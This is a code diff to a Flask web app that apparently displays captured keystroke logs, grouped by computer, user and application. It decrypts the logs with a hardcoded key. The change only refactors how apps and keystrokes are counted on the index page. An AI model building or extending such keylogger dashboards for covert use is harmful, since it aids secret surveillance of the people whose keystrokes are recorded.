@@ -12,21 +12,19 @@ def decrypt_data(data: bytes, key='KopLeoRos') -> bytes:
 
 @app.route('/')
 def index():
-    computers = {}
-    
-    for computer_name, users in json_data.items():
-        app_count = 0
-        key_count = 0
-        
-        for user, apps in users.items():
-            app_count += len(apps)
-            key_count += sum(len(app.values()) for app in apps.values())
-            # for app, timestamps in apps.items():
-            #     key_count += sum(len(keys) for keys in timestamps.values())
-        
-        computers[computer_name] = {"app_count": app_count, "key_count": key_count}
-    
-    return render_template('index.html', computers=computers)
+    computers_summary = {}
+
+    for computer, users in json_data.items():
+        app_count = len(set(app for user in users.values() for app in user))
+        key_count = sum(len(keys) for user in users.values() for app in user.values() for logs in app.values() for keys in logs)
+
+        computers_summary[computer] = {
+            "app_count": app_count,
+            "key_count": key_count
+        }
+
+    return render_template("index.html", computers=computers_summary)
+
 
 @app.route('/computer/<computer_name>')
 def computer_logs(computer_name):
